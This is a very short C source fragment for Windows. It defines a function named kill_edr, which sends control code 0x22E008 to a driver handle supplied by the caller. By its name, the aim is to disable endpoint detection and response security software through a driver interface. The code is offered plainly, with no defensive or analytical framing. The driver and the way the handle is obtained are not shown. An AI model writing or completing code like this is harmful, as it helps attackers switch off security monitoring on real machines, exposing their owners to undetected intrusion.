#include <windows.h>

void kill_edr(HANDLE hDrv) {
  DWORD returned = 0;
  DeviceIoControl(hDrv, 0x22E008, NULL, 0, NULL, 0, &returned, NULL);
}
